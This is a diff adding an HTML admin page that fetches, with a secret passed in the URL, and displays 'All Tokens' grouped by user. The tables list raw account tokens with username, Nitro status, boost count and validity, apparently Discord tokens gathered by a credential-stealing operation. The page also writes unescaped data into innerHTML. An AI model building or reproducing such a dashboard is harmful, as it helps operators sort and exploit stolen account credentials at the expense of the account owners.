@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin - All Tokens</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
+        .container { max-width: 1400px; margin: auto; }
+        .card { background: #1a1a2e; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #2a2a3e; }
+        .valid { color: #57f287; }
+        .invalid { color: #ed4245; }
+        input, button { padding: 10px; margin: 5px; border-radius: 5px; border: none; }
+        button { background: #5865f2; color: white; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <h1>🔐 Admin Panel</h1>
+        <input type="password" id="secret" placeholder="Admin Secret">
+        <button onclick="loadData()">Load All Tokens</button>
+    </div>
+    <div id="results"></div>
+</div>
+
+<script>
+async function loadData() {
+    const secret = document.getElementById('secret').value;
+    if (!secret) return alert('Enter secret');
+    
+    const res = await fetch(`/api/admin/all_tokens?secret=${secret}`);
+    const data = await res.json();
+    
+    if (data.error) {
+        document.getElementById('results').innerHTML = `<div class="card" style="color:#ed4245;">❌ ${data.error}</div>`;
+        return;
+    }
+    
+    let html = `<div class="card"><h2>📊 Summary</h2>
+        <p>Total Users: ${data.total_users}</p>
+        <p>Total Tokens: ${data.total_tokens}</p>
+    </div>`;
+    
+    for (const [user, tokens] of Object.entries(data.data)) {
+        html += `<div class="card"><h3>👤 User: ${user}</h3>
+        <table><thead><tr><th>Token</th><th>Username</th><th>Nitro</th><th>Boosts</th><th>Status</th></tr></thead><tbody>`;
+        
+        for (const t of tokens) {
+            html += `<tr>
+                <td><code>${t.token}</code></td>
+                <td>${t.username || '?'}</td>
+                <td>${t.nitro || 'None'}</td>
+                <td>${t.boosts || 0}</td>
+                <td class="${t.valid ? 'valid' : 'invalid'}">${t.valid ? '✅ Valid' : '❌ Invalid'}</td>
+            </tr>`;
+        }
+        html += `</tbody></table></div>`;
+    }
+    
+    document.getElementById('results').innerHTML = html;
+}
+</script>
+</body>
+</html>
